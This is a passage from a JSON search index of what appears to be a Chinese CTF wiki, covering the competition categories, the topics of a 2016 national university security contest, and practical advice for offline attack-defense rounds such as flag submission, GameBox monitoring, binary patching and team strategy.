\u9898\u76ee\u4e3b\u8981\u8003\u5bdf\u4e8c\u8fdb\u5236\u6f0f\u6d1e\u7684\u53d1\u6398\u548c\u5229\u7528\uff0c\u9700\u8981\u5bf9\u8ba1\u7b97\u673a\u64cd\u4f5c\u7cfb\u7edf\u5e95\u5c42\u6709\u4e00\u5b9a\u7684\u4e86\u89e3\u3002\u5728 CTF \u7ade\u8d5b\u4e2d\uff0cPWN \u9898\u76ee\u4e3b\u8981\u51fa\u73b0\u5728 Linux \u5e73\u53f0\u4e0a\u3002 Crypto - \u5bc6\u7801\u653b\u51fb \u4e3b\u8981\u5305\u62ec\u53e4\u5178\u5bc6\u7801\u5b66\u548c\u73b0\u4ee3\u5bc6\u7801\u5b66\u4e24\u90e8\u5206\u5185\u5bb9\uff0c\u53e4\u5178\u5bc6\u7801\u5b66\u8da3\u5473\u6027\u5f3a\uff0c\u79cd\u7c7b\u7e41\u591a\uff0c\u73b0\u4ee3\u5bc6\u7801\u5b66\u5b89\u5168\u6027\u9ad8\uff0c\u5bf9\u7b97\u6cd5\u7406\u89e3\u7684\u8981\u6c42\u8f83\u9ad8\u3002 Mobile - \u79fb\u52a8\u5b89\u5168 \u4e3b\u8981\u4ecb\u7ecd\u4e86\u5b89\u5353\u9006\u5411\u4e2d\u7684\u5e38\u7528\u5de5\u5177\u548c\u4e3b\u8981\u95ee\u9898\u7c7b\u578b\uff0c\u5b89\u5353\u9006\u5411\u5e38\u5e38\u9700\u8981\u4e00\u5b9a\u7684\u5b89\u5353\u5f00\u53d1\u77e5\u8bc6\uff0ciOS \u9006\u5411\u9898\u76ee\u5728 CTF \u7ade\u8d5b\u4e2d\u8f83\u5c11\u51fa\u73b0\uff0c\u56e0\u6b64\u4e0d\u4f5c\u8fc7\u591a\u4ecb\u7ecd\u3002 Misc - \u5b89\u5168\u6742\u9879 \u4ee5\u8bf8\u845b\u5efa\u4f1f\u7ffb\u8bd1\u7684\u300a\u7ebf\u4e0a\u5e7d\u7075\uff1a\u4e16\u754c\u5934\u53f7\u9ed1\u5ba2\u7c73\u7279\u5c3c\u514b\u81ea\u4f20\u300b\u548c\u4e00\u4e9b\u5178\u578b MISC \u9898\u4e3a\u5207\u5165\u70b9\uff0c\u5185\u5bb9\u4e3b\u8981\u5305\u62ec\u4fe1\u606f\u641c\u96c6\u3001\u7f16\u7801\u5206\u6790\u3001\u53d6\u8bc1\u5206\u6790\u3001\u9690\u5199\u5206\u6790\u7b49\u3002","title":"CTF \u7ade\u8d5b\u5185\u5bb9"},{"location":"introduction/content/#-","text":"2016 \u5e74\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u5f00\u59cb\u4e3e\u529e\u521b\u65b0\u5b9e\u8df5\u6280\u80fd\u8d5b\uff0c\u91c7\u53d6\u7684\u5c31\u662f\u4f20\u7edf\u7684 CTF \u8d5b\u5236\u3002\u5728\u300a2016 \u5e74\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u53c2\u8d5b\u6307\u5357\u300b\u4e2d\u4e3b\u529e\u65b9\u7ed9\u51fa\u7684\u7ade\u8d5b\u5185\u5bb9\u76f8\u5bf9\u5168\u9762\uff0c\u503c\u5f97\u53c2\u8003\u3002 \u7cfb\u7edf\u5b89\u5168\u3002\u6d89\u53ca\u64cd\u4f5c\u7cfb\u7edf\u548c Web \u7cfb\u7edf\u5b89\u5168\uff0c\u5305\u62ec Web \u7f51\u7ad9\u591a\u79cd\u8bed\u8a00\u6e90\u4ee3\u7801\u5ba1\u8ba1\u5206\u6790\uff08\u7279\u522b\u662f PHP\uff09\u3001\u6570\u636e\u5e93\u7ba1\u7406\u548c SQL \u64cd\u4f5c\u3001Web \u6f0f\u6d1e\u6316\u6398\u548c\u5229\u7528\uff08\u5982 SQL \u6ce8\u5165\u548cXSS\uff09\u3001\u670d\u52a1\u5668\u63d0\u6743\u3001\u7f16\u5199\u4ee3\u7801\u8865\u4e01\u5e76\u4fee\u590d\u7f51\u7ad9\u6f0f\u6d1e\u7b49\u5b89\u5168\u6280\u80fd\u3002 \u8f6f\u4ef6\u9006\u5411\u3002\u6d89\u53ca Windows/Linux/Android \u5e73\u53f0\u7684\u591a\u79cd\u7f16\u7a0b\u6280\u672f\uff0c\u8981\u6c42\u5229\u7528\u5e38\u7528\u5de5\u5177\u5bf9\u6e90\u4ee3\u7801\u53ca\u4e8c\u8fdb\u5236\u6587\u4ef6\u8fdb\u884c\u9006\u5411\u5206\u6790\uff0c\u638c\u63e1 Android \u79fb\u52a8\u5e94\u7528 APK \u6587\u4ef6\u7684\u9006\u5411\u5206\u6790\uff0c\u638c\u63e1\u52a0\u89e3\u5bc6\u3001\u5185\u6838\u7f16\u7a0b\u3001\u7b97\u6cd5\u3001\u53cd\u8c03\u8bd5\u548c\u4ee3\u7801\u6df7\u6dc6\u6280\u672f\u3002 \u6f0f\u6d1e\u6316\u6398\u548c\u5229\u7528\u3002\u638c\u63e1 C/C++/Python/PHP/Java/Ruby/\u6c47\u7f16 \u7b49\u8bed\u8a00\uff0c\u6316\u6398 Windows/Linux\uff08x86/x86_64 \u5e73\u53f0\uff09\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u6f0f\u6d1e\uff0c\u638c\u63e1\u7f13\u51b2\u533a\u6ea2\u51fa\u548c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u653b\u51fb\uff0c\u7f16\u5199\u5e76\u5229\u7528 shellcode\u3002 \u5bc6\u7801\u5b66\u539f\u7406\u53ca\u5e94\u7528\u3002\u638c\u63e1\u53e4\u5178\u5bc6\u7801\u5b66\u548c\u73b0\u4ee3\u5bc6\u7801\u5b66\uff0c\u5206\u6790\u5bc6\u7801\u7b97\u6cd5\u548c\u534f\u8bae\uff0c\u8ba1\u7b97\u5bc6\u94a5\u548c\u8fdb\u884c\u52a0\u89e3\u5bc6\u64cd\u4f5c\u3002 \u5176\u4ed6\u5185\u5bb9\u3002\u5305\u62ec\u4fe1\u606f\u641c\u96c6\u80fd\u529b\uff0c\u7f16\u7a0b\u80fd\u529b\u3001\u79fb\u52a8\u5b89\u5168\u3001\u4e91\u7aef\u8ba1\u7b97\u5b89\u5168\u3001\u53ef\u4fe1\u8ba1\u7b97\u3001\u81ea\u4e3b\u53ef\u63a7\u3001\u9690\u5199\u672f\u548c\u4fe1\u606f\u9690\u85cf\u3001\u8ba1\u7b97\u673a\u53d6\u8bc1\uff08Forensics\uff09\u6280\u672f\u548c\u6587\u4ef6\u6062\u590d\u6280\u80fd\uff0c\u8ba1\u7b97\u673a\u7f51\u7edc\u57fa\u7840\u4ee5\u53ca\u5bf9\u7f51\u7edc\u6d41\u91cf\u7684\u5206\u6790\u80fd\u529b\u3002","title":"\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b - \u7ade\u8d5b\u5185\u5bb9"},{"location":"introduction/experience/","text":"\u7ebf\u4e0b\u653b\u9632\u7ecf\u9a8c\u5c0f\u7ed3 \u00b6 \u9996\u5148\uff0c\u6b63\u5e38\u6bd4\u8d5b\u4f1a\u63d0\u4f9b\u63d0\u4ea4 flag \u7684\u63a5\u53e3\uff0c\u63a5\u53e3\u5730\u5740\u7c7b\u4f3c http://172.16.4.1/Common/submitAnswer \u3002\u4e00\u822c\u6211\u4eec\u9700\u8981\u6839\u636e\u4e3b\u529e\u65b9\u7ed9\u51fa\u7684\u6587\u6863\u8981\u6c42\u901a\u8fc7\u63a5\u53e3\u63d0\u4ea4 flag\u3002\u5728\u6bd4\u8d5b\u4e2d\u8981\u6c42\u63a5\u53e3\u5730\u5740\u4f7f\u7528 Post \u65b9\u5f0f\u63d0\u4ea4\uff0c\u63d0\u4ea4\u65f6\u5e26\u4e24\u4e2a\u53c2\u6570\uff0c\u4e00\u4e2a\u662f Answer \uff0c\u5176\u503c\u4e3a\u83b7\u53d6\u5230\u7684 flag \u5b57\u7b26\u4e32\uff0c\u800c\u53e6\u4e00\u4e2a\u5219\u662f token \uff0c\u5176\u503c\u4e3a\u5404\u4e2a\u961f\u4f0d\u7684\u961f\u4f0d Token\u3002 \u7136\u540e\u6bd4\u8d5b\u65f6\u4e3b\u529e\u65b9\u4e5f\u4f1a\u7ed9\u6bcf\u4e2a\u53c2\u8d5b\u961f\u4f0d\u63d0\u4f9b\u4e00\u53f0\u7528\u4e8e \u5206\u6790\u7f51\u7edc\u6d41\u91cf\u7684\u865a\u62df\u673a \uff0c\u9009\u624b\u9700\u8981\u8bbf\u95ee\u5730\u5740\u4e0b\u8f7d\u6d41\u91cf\u6587\u4ef6\u8fdb\u884c\u5206\u6790\u3002 \u5173\u6ce8 Gamebox \u72b6\u6001 \u00b6 \u6bd4\u8d5b\u4e2d\u53ef\u4ee5\u67e5\u770b\u5df1\u65b9\u548c\u654c\u65b9 GameBox \u72b6\u6001\u3002\u65f6\u523b\u5173\u6ce8\u53ef\u4ee5\u5c3d\u65e9\u83b7\u53d6\u6bd4\u8d5b\u4fe1\u606f\uff0c\u6839\u636e\u4fe1\u606f\u505a\u51fa\u8c03\u6574\u3002 \u5bf9\u4e8e\u5df1\u65b9 GameBox\uff0c\u6709\u5b58\u5728\u5982\u4e0b\u539f\u56e0\u9020\u6210 GameBox \u88ab down \u6389\uff1a \u4e3b\u529e\u65b9\u88c1\u5224\u7cfb\u7edf\u5b58\u5728\u5931\u8bef\uff0c\u8bef\u5224 GameBox \u4e3a\u4e0d\u53ef\u7528\u72b6\u6001\u3002\u8fd9\u79cd\u60c5\u51b5\u4e00\u822c\u5728\u6bd4\u8d5b\u5f00\u59cb\u524d\u53ef\u4ee5\u53d1\u73b0\uff0c\u5982\u679c\u53d1\u73b0\u5b58\u5728\u8fd9\u79cd\u60c5\u51b5\uff0c\u8981\u5c3d\u65e9\u5411\u5de5\u4f5c\u4eba\u5458\u793a\u610f\u5904\u7406\u4ee5\u51cf\u5c11\u635f\u5931\u3002 \u7a0b\u5e8f patch \u5931\u8bef\u5bfc\u81f4\u670d\u52a1\u4e0d\u53ef\u7528\u3002\u5728\u7a0b\u5e8f patch \u5b8c\u4e4b\u540e\u8981\u8fdb\u5165\u4e0b\u4e00\u8f6e\u5173\u6ce8 GameBox \u72b6\u6001\uff0c\u5982\u679c patch \u5931\u8bef\u5bfc\u81f4\u4e0d\u53ef\u7528\uff0c\u9700\u8981\u53ca\u65f6\u633d\u6551\u3002\u4f46\u662f\u4e5f\u4e0d\u8981\u8fc7\u5ea6\u62c5\u5fc3\u628a\u539f\u6765\u7684\u672a\u4fee\u8865\u8fc7\u7684\u6f0f\u6d1e\u7a0b\u5e8f\u6362\u56de\u53bb\u3002\u56e0\u4e3a down \u6389\u662f\u6240\u6709\u961f\u5e73\u5206\u5f97\u5f88\u5c11\u7684\u5206\uff0c\u800c\u76f4\u63a5\u4e0a\u6f0f\u6d1e\u7a0b\u5e8f\u4f1a\u4f7f\u5f97\u5f3a\u52bf\u7684\u961f\u4f0d\u76f4\u63a5\u5229\u7528\u5f97\u5230\u5f88\u9ad8\u7684\u5f97\u5206\u3002\u6240\u4ee5\u8981\u4f9d\u636e\u5177\u4f53\u60c5\u51b5\u5bf9\u5f85\u3002 \u5bf9\u624b\u4e0d\u6b63\u5f53\u653b\u51fb\u5bfc\u81f4 GameBox \u4e0d\u53ef\u7528\u3002\u5982\u679c\u53d1\u73b0\uff0c\u9700\u8981\u53ca\u65f6\u8865\u6551\u3002 \u4e3b\u529e\u65b9\u52a0\u5f3a\u7a0b\u5e8f check\u3002\u8fd9\u79cd\u60c5\u51b5\u4e3b\u529e\u65b9\u4f1a\u5bf9\u6240\u6709\u961f\u5458\u8fdb\u884c\u901a\u77e5\u516c\u544a\u3002\u5728 GameBox \u72b6\u6001\u5899\u4e0a\u7684\u72b6\u6001\u4f1a\u663e\u793a\u8be5\u9898\u7684\u5404\u961f GameBox \u5927\u9762\u79ef\u4e0d\u53ef\u7528\u3002 \u5bf9\u4e8e\u654c\u65b9 GameBox\u3002\u6211\u4eec\u53ef\u4ee5\u83b7\u53d6\u4ee5\u4e0b\u4fe1\u606f\u3002 \u6839\u636e\u653b\u51fb\u6d41\u89c2\u6d4b\u54ea\u4e9b\u961f\u4f0d\u7684 GameBox \u6ca1\u6709\u9632\u5fa1\u6210\u529f\u3002\u9488\u5bf9\u8fd9\u4e9b\u961f\u4f0d\u53ef\u4ee5\u66f4\u591a\u5730\u5b9e\u73b0\u653b\u51fb \u6709\u961f\u4f0d\u62ff\u51fa\u4e00\u8840\u65f6\u3002\u53ef\u4ee5\u6839\u636e\u5404\u961f GameBox \u72b6\u6001\u63a8\u65ad\u51fa\u4e00\u8840\u961f\u4f0d\u662f\u5426\u5df2\u7ecf\u5199\u51fa\u5229\u7528\u811a\u672c\u3002\u5199\u51fa\u5229\u7528\u811a\u672c\u540e\u53ef\u4ee5\u89c2\u6d4b\u5df1\u65b9\u662f\u5426\u505a\u597d\u4e86\u9632\u5fa1\u3002 \u5206\u6e05\u533a\u6bb5\u4e0e\u7aef\u53e3 \u00b6 \u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\u4f1a\u4e3b\u529e\u65b9\u4f1a\u5b89\u6392\u597d\u5408\u7406\u7684\u7f51\u6bb5\u5206\u5e03\u3002 \u7ef4\u62a4\u7684\u65f6\u5019\u9700\u8981\u8fde\u63a5\u5230\u672c\u961f GameBox \u6240\u5728\u7f51\u6bb5\u4e0a\uff0c\u6839\u636e\u4e3b\u529e\u65b9\u63d0\u4f9b\u7684 CTF \u8d26\u53f7\u4e0e\u5bc6\u7801\u767b\u5f55\u3002\u800c\u4e0e\u5176\u4ed6\u961f\u4f0d\u7684 GameBox \u4ea4\u4e92\u65f6\u5219\u9700\u8981\u8fde\u63a5\u5230\u5bf9\u5e94\u7684\u7f51\u6bb5\u91cc\u4e0e\u6f0f\u6d1e\u7a0b\u5e8f\u8fdb\u884c\u4ea4\u4e92\u3002\u63d0\u4ea4 flag \u5219\u9700\u8981\u5230\u6307\u5b9a\u7684\u7b54\u9898\u5e73\u53f0\u4e0a\u63d0\u4ea4\u3002 Warning \u8fd9\u91cc\u5c24\u5176\u9700\u8981\u6ce8\u610f\u7684\u5c31\u662f\u7aef\u53e3\u3002\u5982\u679c\u7aef\u53e3\u5728\u4e0d\u8f7b\u6613\u95f4\u5f04\u9519\u7684\u8bdd\uff0c\u8fd9\u6837\u7684\u9519\u8bef\u662f\u633a\u96be\u5bdf\u89c9\u5230\u7684\uff0c\u800c\u8fd9\u6837\u7684\u5931\u8bef\u4e5f\u4f1a\u5e26\u6765\u4e0d\u5fc5\u8981\u7684\u635f\u5931\u3002\u751a\u81f3\u4f1a\u51fa\u73b0\u957f\u65f6\u95f4\u65e0\u6cd5\u63d0\u4ea4 flag \u7684\u81f4\u547d\u60c5\u51b5\u3002\u6240\u4ee5\u9700\u8981\u5c0f\u5fc3\u6ce8\u610f\u3002 \u670d\u52a1 patch \u4e0e\u9632\u5fa1 \u00b6 \u7a0b\u5e8f patch \u8981\u5408\u7406\u5e76\u540c\u65f6\u7b26\u5408\u88c1\u5224\u7cfb\u7edf check \u6761\u4ef6\u3002\u867d\u7136\u7cfb\u7edf\u7684 check \u5e76\u672a\u516c\u5f00\u662f check \u54ea\u91cc\uff0c\u4f46\u662f\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u7cfb\u7edf\u662f\u4e0d\u4f1a\u8fc7\u5ea6\u4e3a\u96be\u7684\u3002 \u7a0b\u5e8f patch \u4f7f\u7528 IDA \u8fdb\u884c\u4fee\u6539\uff0cIDA \u63d0\u4f9b\u4e86\u4e09\u79cd\u65b9\u5f0f\u7684 patch\uff1abyte\uff0cword\uff0cassemble.\u5176\u4e2d\u5b57\u8282\u7801\u4fee\u6539\u6bd4\u8f83\u597d\u7528\u3002\u56e0\u4e3a\u9010\u5b57\u8282\u4fee\u6539\u4e0d\u9700\u8003\u8651\u6c47\u7f16\u6307\u4ee4\uff0c\u4e00\u822c\u8fd9\u6837\u7684\u4fee\u6539\u6539\u52a8\u4e5f\u5f88\u5c0f\uff0c\u5728\u4e00\u5b9a\u573a\u5408\u4e0b\u5341\u5206\u597d\u7528\u3002\u6c47\u7f16\u6307\u4ee4\u7ea7\u522b\u7684\u4fee\u6539\u867d\u7136\u65b9\u4fbf\u4e0d\u9700\u8981\u4fee\u6539\u5b57\u8282\u7801\uff0c\u4f46\u662f\u4e5f\u9020\u6210\u4e86\u4e00\u5b9a\u7684\u4e0d\u4fbf\u3002\u6bd4\u5982\u9700\u8981\u989d\u5916\u8003\u8651\u6c47\u7f16\u6307\u4ee4\u7684\u957f\u5ea6\uff0c\u7ed3\u6784\u662f\u5426\u5408\u7406\u5b8c\u6574\uff0c\u903b\u8f91\u662f\u5426\u548c\u539f\u6765\u4e00\u6837\uff0c\u4fee\u6539\u7684\u6c47\u7f16\u6307\u4ee4\u662f\u5426\u5408\u6cd5\u7b49\u95ee\u9898\u3002 \u5728 patch \u7a0b\u5e8f\u65f6\u8981\u8bb0\u5f97\u5907\u4efd\u539f\u6765\u7684\u6f0f\u6d1e\u7a0b\u5e8f\uff0c\u4ee5\u4f9b\u961f\u4f0d\u5206\u6790\u4f7f\u7528\u3002\u5728\u4e0a\u4f20 patch \u7684\u65f6\u5019\u5e94\u8be5\u5148\u5220\u9664\u539f\u6765\u7684\u6f0f\u6d1e\u7a0b\u5e8f\uff0c\u7136\u540e\u5c06 patch \u8fc7\u7684\u7a0b\u5e8f\u590d\u5236\u8fdb\u53bb\uff0c\u590d\u5236\u8fdb\u53bb\u4e4b\u540e\u8fd8\u9700\u8981\u7ed9\u7a0b\u5e8f\u8d4b\u4e88\u76f8\u5e94\u7684\u6743\u9650\u3002 \u4e00\u822c\u6bd4\u8d5b\u4e2d\uff0c\u6f0f\u6d1e\u7a0b\u5e8f\u4f1a\u6709\u5341\u51e0\u5904\u9700\u8981 patch \u7684\u5730\u65b9\u3002Patch \u7684\u65f6\u5019\u4e0d\u4ec5\u8981\u8bb2\u7a76\u6709\u6548\u5408\u7406\uff0c\u8fd8\u8981\u6ee1\u8db3\u80fd\u591f\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u9632\u8303\u6216\u6df7\u6dc6\u5bf9\u624b\u7684\u5206\u6790\u3002 \u6784\u9020\u811a\u672c\u6846\u67b6\u5feb\u901f\u5c55\u5f00\u653b\u51fb \u00b6 \u5728\u653b\u9632\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\uff0c\u4e00\u8840\u663e\u5f97\u5c24\u5176\u91cd\u8981\u3002\u56e0\u6b64\u6709\u4e00\u4e2a\u653b\u51fb\u811a\u672c\u6846\u67b6\u662f\u975e\u5e38\u6709\u5229\u7684\u3002\u5feb\u901f\u5f00\u53d1\u653b\u51fb\u811a\u672c\uff0c\u53ef\u4ee5\u5728\u524d\u671f\u4fdd\u6301\u4f18\u52bf\u5730\u4f4d\uff0c\u4e5f\u53ef\u4ee5\u5728\u4e0d\u65ad\u62ff\u5206\u7684\u540c\u65f6\u7701\u4e0b\u65f6\u95f4\u53bb\u505a\u597d\u9632\u5fa1\u3002 \u6bd4\u8d5b\u7684\u4e00\u4e9b\u7b56\u7565 \u00b6 \u5728\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u5b9c\u6b7b\u8017\u5728\u4e00\u9053\u9898\u4e0a\uff0c\u7531\u4e8e\u4e00\u8840\u7684\u4f18\u52bf\u6027\uff0c\u5728\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\u66f4\u5e94\u8be5\u5168\u9762\u4e86\u89e3\u8d5b\u9898\u96be\u5ea6\uff0c\u5148\u4ece \u7b80\u5355\u9898 \u5f00\u59cb\u8fdb\u884c\u5206\u6790\uff0c\u6b65\u6b65\u4e3a\u8425\u3002 \u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\uff0c\u4e24\u6781\u4f1a\u4e25\u91cd\u5206\u5316\u3002\u5e94\u8be5\u7740\u529b\u6253\u51fb\u548c\u81ea\u5df1\u5b9e\u529b\u76f8\u5f53\u548c\u6bd4\u81ea\u5df1\u961f\u4f0d\u66f4\u5f3a\u7684\u961f\u4f0d\uff0c\u5c24\u5176\u662f\u5206\u6570\u76f8\u5dee\u65e0\u51e0\u7684\u60c5\u51b5\u4e0b\uff0c\u66f4\u8981\u4e25\u9632\u4e25\u5b88\u3002 \u6bd4\u8d5b\u4e2d NPC \u4f1a\u4e0d\u5b9a\u65f6\u53d1\u51fa\u653b\u51fb\u6d41\u91cf\u3002\u4ece\u653b\u51fb\u6d41\u91cf\u4e2d\u53ef\u4ee5\u5f97\u5230 payload\u3002 \u4e00\u5b9a\u8981\u628a NPC \u5f80\u6b7b\u91cc\u6253\u3002 \u5728\u5f00\u8d5b\u521d\u53ef\u4ee5\u5c06\u6240\u6709\u7684\u7ba1\u7406\u5bc6\u7801\u90fd\u8bbe\u7f6e\u4e3a\u540c\u4e00\u4e2a\u5bc6\u7801\uff0c\u8fd9\u6837\u65b9\u4fbf\u961f\u5458\u767b\u5f55\u7ba1\u7406\u3002\u5728\u521d\u671f\u5c06\u6240\u6709\u6587\u4ef6\u5907\u4efd\u4e0b\u6765\u4f9b\u961f\u5185\u5206\u4eab\u3002","title":"\u7ebf\u4e0b\u653b\u9632\u7ecf\u9a8c\u5c0f\u7ed3"},{"location":"introduction/experience/#_1","text":"\u9996\u5148\uff0c\u6b63\u5e38\u6bd4\u8d5b\u4f1a\u63d0\u4f9b\u63d0\u4ea4 flag \u7684\u63a5\u53e3\uff0c\u63a5\u53e3\u5730\u5740\u7c7b\u4f3c http://172.16.4.1/Common/submitAnswer \u3002\u4e00\u822c\u6211\u4eec\u9700\u8981\u6839\u636e\u4e3b\u529e\u65b9\u7ed9\u51fa\u7684\u6587\u6863\u8981\u6c42\u901a\u8fc7\u63a5\u53e3\u63d0\u4ea4 flag\u3002\u5728\u6bd4\u8d5b\u4e2d\u8981\u6c42\u63a5\u53e3\u5730\u5740\u4f7f\u7528 Post \u65b9\u5f0f\u63d0\u4ea4\uff0c\u63d0\u4ea4\u65f6\u5e26\u4e24\u4e2a\u53c2\u6570\uff0c\u4e00\u4e2a\u662f Answer \uff0c\u5176\u503c\u4e3a\u83b7\u53d6\u5230\u7684 flag \u5b57\u7b26\u4e32\uff0c\u800c\u53e6\u4e00\u4e2a\u5219\u662f token \uff0c\u5176\u503c\u4e3a\u5404\u4e2a\u961f\u4f0d\u7684\u961f\u4f0d Token\u3002 \u7136\u540e\u6bd4\u8d5b\u65f6\u4e3b\u529e\u65b9\u4e5f\u4f1a\u7ed9\u6bcf\u4e2a\u53c2\u8d5b\u961f\u4f0d\u63d0\u4f9b\u4e00\u53f0\u7528\u4e8e \u5206\u6790\u7f51\u7edc\u6d41\u91cf\u7684\u865a\u62df\u673a \uff0c\u9009\u624b\u9700\u8981\u8bbf\u95ee\u5730\u5740\u4e0b\u8f7d\u6d41\u91cf\u6587\u4ef6\u8fdb\u884c\u5206\u6790\u3002","title":"\u7ebf\u4e0b\u653b\u9632\u7ecf\u9a8c\u5c0f\u7ed3"},{"location":"introduction/experience/#gamebox","text":"\u6bd4\u8d5b\u4e2d\u53ef\u4ee5\u67e5\u770b\u5df1\u65b9\u548c\u654c\u65b9 GameBox \u72b6\u6001\u3002\u65f6\u523b\u5173\u6ce8\u53ef\u4ee5\u5c3d\u65e9\u83b7\u53d6\u6bd4\u8d5b\u4fe1\u606f\uff0c\u6839\u636e\u4fe1\u606f\u505a\u51fa\u8c03\u6574\u3002 \u5bf9\u4e8e\u5df1\u65b9 GameBox\uff0c\u6709\u5b58\u5728\u5982\u4e0b\u539f\u56e0\u9020\u6210 GameBox \u88ab down \u6389\uff1a \u4e3b\u529e\u65b9\u88c1\u5224\u7cfb\u7edf\u5b58\u5728\u5931\u8bef\uff0c\u8bef\u5224 GameBox \u4e3a\u4e0d\u53ef\u7528\u72b6\u6001\u3002\u8fd9\u79cd\u60c5\u51b5\u4e00\u822c\u5728\u6bd4\u8d5b\u5f00\u59cb\u524d\u53ef\u4ee5\u53d1\u73b0\uff0c\u5982\u679c\u53d1\u73b0\u5b58\u5728\u8fd9\u79cd\u60c5\u51b5\uff0c\u8981\u5c3d\u65e9\u5411\u5de5\u4f5c\u4eba\u5458\u793a\u610f\u5904\u7406\u4ee5\u51cf\u5c11\u635f\u5931\u3002 \u7a0b\u5e8f patch \u5931\u8bef\u5bfc\u81f4\u670d\u52a1\u4e0d\u53ef\u7528\u3002\u5728\u7a0b\u5e8f patch \u5b8c\u4e4b\u540e\u8981\u8fdb\u5165\u4e0b\u4e00\u8f6e\u5173\u6ce8 GameBox \u72b6\u6001\uff0c\u5982\u679c patch \u5931\u8bef\u5bfc\u81f4\u4e0d\u53ef\u7528\uff0c\u9700\u8981\u53ca\u65f6\u633d\u6551\u3002\u4f46\u662f\u4e5f\u4e0d\u8981\u8fc7\u5ea6\u62c5\u5fc3\u628a\u539f\u6765\u7684\u672a\u4fee\u8865\u8fc7\u7684\u6f0f\u6d1e\u7a0b\u5e8f\u6362\u56de\u53bb\u3002\u56e0\u4e3a down \u6389\u662f\u6240\u6709\u961f\u5e73\u5206\u5f97\u5f88\u5c11\u7684\u5206\uff0c\u800c\u76f4\u63a5\u4e0a\u6f0f\u6d1e\u7a0b\u5e8f\u4f1a\u4f7f\u5f97\u5f3a\u52bf\u7684\u961f\u4f0d\u76f4\u63a5\u5229\u7528\u5f97\u5230\u5f88\u9ad8\u7684\u5f97\u5206\u3002\u6240\u4ee5\u8981\u4f9d\u636e\u5177\u4f53\u60c5\u51b5\u5bf9\u5f85\u3002 \u5bf9\u624b\u4e0d\u6b63\u5f53\u653b\u51fb\u5bfc\u81f4 GameBox \u4e0d\u53ef\u7528\u3002\u5982\u679c\u53d1\u73b0\uff0c\u9700\u8981\u53ca\u65f6\u8865\u6551\u3002 \u4e3b\u529e\u65b9\u52a0\u5f3a\u7a0b\u5e8f check\u3002\u8fd9\u79cd\u60c5\u51b5\u4e3b\u529e\u65b9\u4f1a\u5bf9\u6240\u6709\u961f\u5458\u8fdb\u884c\u901a\u77e5\u516c\u544a\u3002\u5728 GameBox \u72b6\u6001\u5899\u4e0a\u7684\u72b6\u6001\u4f1a\u663e\u793a\u8be5\u9898\u7684\u5404\u961f GameBox \u5927\u9762\u79ef\u4e0d\u53ef\u7528\u3002 \u5bf9\u4e8e\u654c\u65b9 GameBox\u3002\u6211\u4eec\u53ef\u4ee5\u83b7\u53d6\u4ee5\u4e0b\u4fe1\u606f\u3002 \u6839\u636e\u653b\u51fb\u6d41\u89c2\u6d4b\u54ea\u4e9b\u961f\u4f0d\u7684 GameBox \u6ca1\u6709\u9632\u5fa1\u6210\u529f\u3002\u9488\u5bf9\u8fd9\u4e9b\u961f\u4f0d\u53ef\u4ee5\u66f4\u591a\u5730\u5b9e\u73b0\u653b\u51fb \u6709\u961f\u4f0d\u62ff\u51fa\u4e00\u8840\u65f6\u3002\u53ef\u4ee5\u6839\u636e\u5404\u961f GameBox \u72b6\u6001\u63a8\u65ad\u51fa\u4e00\u8840\u961f\u4f0d\u662f\u5426\u5df2\u7ecf\u5199\u51fa\u5229\u7528\u811a\u672c\u3002\u5199\u51fa\u5229\u7528\u811a\u672c\u540e\u53ef\u4ee5\u89c2\u6d4b\u5df1\u65b9\u662f\u5426\u505a\u597d\u4e86\u9632\u5fa1\u3002","title":"\u5173\u6ce8 Gamebox \u72b6\u6001"},{"location":"introduction/experience/#_2","text":"\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\u4f1a\u4e3b\u529e\u65b9\u4f1a\u5b89\u6392\u597d\u5408\u7406\u7684\u7f51\u6bb5\u5206\u5e03\u3002 \u7ef4\u62a4\u7684\u65f6\u5019\u9700\u8981\u8fde\u63a5\u5230\u672c\u961f GameBox \u6240\u5728\u7f51\u6bb5\u4e0a\uff0c\u6839\u636e\u4e3b\u529e\u65b9\u63d0\u4f9b\u7684 CTF \u8d26\u53f7\u4e0e\u5bc6\u7801\u767b\u5f55\u3002\u800c\u4e0e\u5176\u4ed6\u961f\u4f0d\u7684 GameBox \u4ea4\u4e92\u65f6\u5219\u9700\u8981\u8fde\u63a5\u5230\u5bf9\u5e94\u7684\u7f51\u6bb5\u91cc\u4e0e\u6f0f\u6d1e\u7a0b\u5e8f\u8fdb\u884c\u4ea4\u4e92\u3002\u63d0\u4ea4 flag \u5219\u9700\u8981\u5230\u6307\u5b9a\u7684\u7b54\u9898\u5e73\u53f0\u4e0a\u63d0\u4ea4\u3002 Warning \u8fd9\u91cc\u5c24\u5176\u9700\u8981\u6ce8\u610f\u7684\u5c31\u662f\u7aef\u53e3\u3002\u5982\u679c\u7aef\u53e3\u5728\u4e0d\u8f7b\u6613\u95f4\u5f04\u9519\u7684\u8bdd\uff0c\u8fd9\u6837\u7684\u9519\u8bef\u662f\u633a\u96be\u5bdf\u89c9\u5230\u7684\uff0c\u800c\u8fd9\u6837\u7684\u5931\u8bef\u4e5f\u4f1a\u5e26\u6765\u4e0d\u5fc5\u8981\u7684\u635f\u5931\u3002\u751a\u81f3\u4f1a\u51fa\u73b0\u957f\u65f6\u95f4\u65e0\u6cd5\u63d0\u4ea4 flag \u7684\u81f4\u547d\u60c5\u51b5\u3002\u6240\u4ee5\u9700\u8981\u5c0f\u5fc3\u6ce8\u610f\u3002","title":"\u5206\u6e05\u533a\u6bb5\u4e0e\u7aef\u53e3"},{"location":"introduction/experience/#patch","text":"\u7a0b\u5e8f patch \u8981\u5408\u7406\u5e76\u540c\u65f6\u7b26\u5408\u88c1\u5224\u7cfb\u7edf check 